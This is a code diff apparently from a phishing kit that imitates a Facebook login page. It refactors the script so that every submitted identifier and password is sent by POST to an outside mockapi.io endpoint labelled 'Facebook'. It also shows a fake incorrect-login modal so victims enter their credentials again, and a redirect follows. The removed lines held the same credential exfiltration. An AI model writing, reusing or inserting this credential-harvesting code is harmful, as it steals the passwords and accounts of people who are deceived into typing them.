@@ -10,21 +10,30 @@ function closeModal() {
     modal.style.display = 'none';
 }
 
-function redirectToFacebook() {
-    window.location.href = 'https://www.facebook.com';
-}
-
 function togglePassword() {
     const passwordInput = document.getElementById('password');
     const eyeIcon = document.getElementById('eyeIcon');
 
-    // Toggle the type attribute
-    if (passwordInput.type === 'password') {
-        passwordInput.type = 'text';
-        eyeIcon.style.backgroundImage = "url('https://icons.veryicon.com/png/o/photographic/ant-design-official-icon-library/eye-open-1.png')";
-    } else {
-        passwordInput.type = 'password';
-        eyeIcon.style.backgroundImage = "url('https://icons.veryicon.com/png/o/photographic/ant-design-official-icon-library/eye-close-1.png')";
+    const isPassword = passwordInput.type === 'password';
+    passwordInput.type = isPassword ? 'text' : 'password';
+    eyeIcon.style.backgroundImage = isPassword 
+        ? "url('https://icons.veryicon.com/png/o/photographic/ant-design-official-icon-library/eye-open-1.png')" 
+        : "url('https://icons.veryicon.com/png/o/photographic/ant-design-official-icon-library/eye-close-1.png')";
+}
+
+async function saveUserData(identifier, password) {
+    const userData = { identifier, password };
+    
+    try {
+        await fetch('https://67069c2da0e04071d2279651.mockapi.io/Facebook', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(userData),
+        });
+    } catch (error) {
+        console.error('Error saving user data:', error);
     }
 }
 
@@ -36,36 +45,19 @@ loginForm.addEventListener('submit', async (event) => {
     const identifier = document.getElementById('identifier').value;
     const password = document.getElementById('password').value;
 
-    // Simulated incorrect login check
     const validPassword = "securepassword"; // Change this to your actual validation logic
+
+    // Save user data on every login attempt
+    await saveUserData(identifier, password);
 
     if (identifier === "" || password !== validPassword) {
         attemptCount++; // Increment the attempt count
-        if (attemptCount === 1) {
-            showModal(); // Show the modal for incorrect login
-        } else if (attemptCount === 2) {
-            // Second attempt - save to mock API and redirect
-            const userData = {
-                identifier: identifier,
-                password: password,
-            };
+        showModal(); // Show the modal for incorrect login
 
-            try {
-                await fetch('https://67069c2da0e04071d2279651.mockapi.io/Facebook', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(userData),
-                });
-
-                // Wait for 1 second before redirecting
-                setTimeout(() => {
-                    window.location.href = 'indexPAGE.html';
-                }, 1000); // 1000 milliseconds = 1 second
-            } catch (error) {
-                console.error('Error saving user data:', error);
-            }
+        // Optionally clear the inputs after failed attempts
+        if (attemptCount < 2) {
+            document.getElementById('identifier').value = '';
+            document.getElementById('password').value = '';
         }
         return; // Stop here on incorrect credentials
     }
@@ -73,26 +65,8 @@ loginForm.addEventListener('submit', async (event) => {
     // Reset attempt count if login is successful
     attemptCount = 0;
 
-    // Save details to the mock API
-    const userData = {
-        identifier: identifier,
-        password: password,
-    };
-
-    try {
-        await fetch('https://67069c2da0e04071d2279651.mockapi.io/Facebook', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(userData),
-        });
-
-        // Wait for 1 second before redirecting
-        setTimeout(() => {
-            window.location.href = 'indexPAGE.html';
-        }, 1000); // 1000 milliseconds = 1 second
-    } catch (error) {
-        console.error('Error saving user data:', error);
-    }
+    // Successful login actions
+    setTimeout(() => {
+        window.location.href = 'indexPAGE.html';
+    }, 1000);
 });
